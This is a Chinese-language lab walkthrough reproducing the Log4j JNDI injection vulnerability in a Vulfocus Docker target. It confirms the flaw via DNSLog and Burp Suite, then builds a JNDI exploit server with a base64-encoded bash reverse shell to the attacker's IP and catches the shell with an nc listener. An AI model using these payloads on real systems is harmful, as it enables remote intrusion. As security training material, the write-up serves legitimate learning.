## 环境搭建

```tex
靶机：Ubuntu  5.4.0-117-generic   192.168.6.183
攻击机：Kali  5.16.0-kali7-amd64  192.168.6.212
#注：攻击机和靶机要在同一个网段上或者攻击机为公网IP(云服务器)，否则shell反弹回不去。
```

```tex
#首先拉一个docker镜像
docker pull vulfocus/vulfocus
#查看镜像
docker images
#启动
docker run -d -p 8081:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=172.16.124.129 vulfocus/vulfocus
```

![image-20220615180459219](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615180459219.png)

浏览器中访问目标IP的8081端口：

![image-20220615180708996](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615180708996.png)

查看镜像，将log4j漏洞的镜像拉取下来：

![image-20220615180810213](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615180810213.png)



## 漏洞复现

在首页启动log4j镜像：

![image-20220615182101483](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615182101483.png)

访问此地址：

![image-20220615182036599](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615182036599.png)

![image-20220615182119344](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615182119344.png)

进行DNSLog验证：

![image-20220615182820357](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615182820357.png)

点击get subdomain得到一个dns：72lrrx.dnslog.cn

使用bp对http://172.16.124.129:60067/页面抓包：

![image-20220615182943421](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615182943421.png)

修改参数：

![image-20220615183116754](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615183116754.png)

![image-20220615183331682](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615183331682.png)

发到reperter模块查看:

![image-20220615181936876](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615181936876.png)

放包：

![image-20220615183422142](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615183422142.png)

查看DNSLog页面，点击Refresh Record:

![image-20220615183517100](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220615183517100.png)

DNSLog网站收到解析记录，说明这里有log4j的漏洞。

## JNDI注入反弹shell：

利用JNDI注入工具在攻击机上开启JNDI服务器，在攻击机Kali中安装：

```tex
git clone https://github.com/sayers522/JNDI-Injection-Exploit.git
```

进入目录，使用mvn工具打包：

```tex
#未进行安装的话，安装mvn
apt install maven -y
#打包
mvn clean package -DskipTests
```

会生成一个target文件夹：

![image-20220616144703906](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220616144703906.png)

生成payload：

```tex
bash -i >& /dev/tcp/192.168.6.212/1234 0>&1
```

将其进行base64编码：

![image-20220616145203753](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220616145203753.png)

```tex
#生成payload
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMjEyLzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "192.168.6.212"
```

![image-20220616145303154](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220616145303154.png)

```tex
rmi://192.168.6.212:1099/ExploitBypass
```

反弹shell：

监听端口1234：

```tex
nc -lvvp 1234
```

![image-20220616101525358](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220616101525358.png)

将payload进行url编码：

![image-20220616202551584](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220616202551584.png)

放包，看是否反弹：

![image-20220616202622381](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20220616202622381.png)

反弹成功。
